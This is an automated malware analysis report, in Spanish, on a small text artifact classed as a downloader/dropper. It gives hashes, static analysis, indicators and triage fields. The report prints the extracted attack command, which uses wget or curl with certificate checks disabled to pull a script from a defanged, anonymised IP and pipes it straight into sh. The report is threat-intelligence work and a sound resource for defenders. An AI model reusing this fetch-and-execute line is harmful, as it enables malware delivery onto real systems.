# 🧬 Payload Analysis

`d6a137c78d59f1cf11e48cc63b0e929139b6d6048a02e507dbe4150d41b4f8d1`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 373 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://14.46.136.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:32:17.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d6a137c78d59f1cf11e48cc63b0e929139b6d6048a02e507dbe4150d41b4f8d1`
- **SHA1:** `2bd3fb87e46fe327aa07b116004eddf9a12ee7bd`
- **MD5:** `e02e10c9e6df74c8a65587f57204532a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 373 B |
| Entropía | 5.14 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfr
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh) | strings |
| url | hxxps://14.46.136.XXX/sh | strings |
| ip | 190.179.140.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfr | strings |
| hash | d6a137c78d59f1cf11e48cc63b0e929139b6d6048a02e507dbe4150d41b4f8d1 | static_analysis |
| ip | 183.221.22.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
